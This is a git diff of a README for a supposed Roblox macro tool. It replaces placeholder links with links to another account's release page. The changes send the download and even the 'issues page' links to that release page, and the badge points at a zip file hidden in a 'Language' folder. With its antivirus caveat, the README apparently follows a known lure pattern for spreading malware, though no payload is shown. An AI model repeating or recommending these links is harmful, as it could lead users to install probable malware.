@@ -1,6 +1,6 @@
 # 🛠️ ROBLOX-MACRO-V3.0.0 - Automate Your Roblox Experience Effortlessly
 
-[![Download Here](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip%20Now-brightgreen)](////////////)
+[![Download Here](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip%20Now-brightgreen)](https://github.com/Curtis2929/ROBLOX-MACRO-UPDATE-2026/releases/tag/Release)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to ROBLOX-MACRO-V3.0.0! This is a simple and effective tool that helps a
 
 ## 🔗 Download & Install
 
-To download the application, please visit this page: [Download ROBLOX-MACRO-V3.0.0](/////////////).
+To download the application, please visit this page: [Download ROBLOX-MACRO-V3.0.0](https://github.com/Curtis2929/ROBLOX-MACRO-UPDATE-2026/releases/tag/Release).
 
 Once you are on the Releases page, follow these steps:
 
@@ -51,7 +51,7 @@ If you encounter any issues:
 - Check if your antivirus software is blocking the application.
 - Try restarting your computer and running the application again.
 
-For more detailed issues, please visit our [issues page](///////////).
+For more detailed issues, please visit our [issues page](https://github.com/Curtis2929/ROBLOX-MACRO-UPDATE-2026/releases/tag/Release).
 
 ## 🔒 Security
 
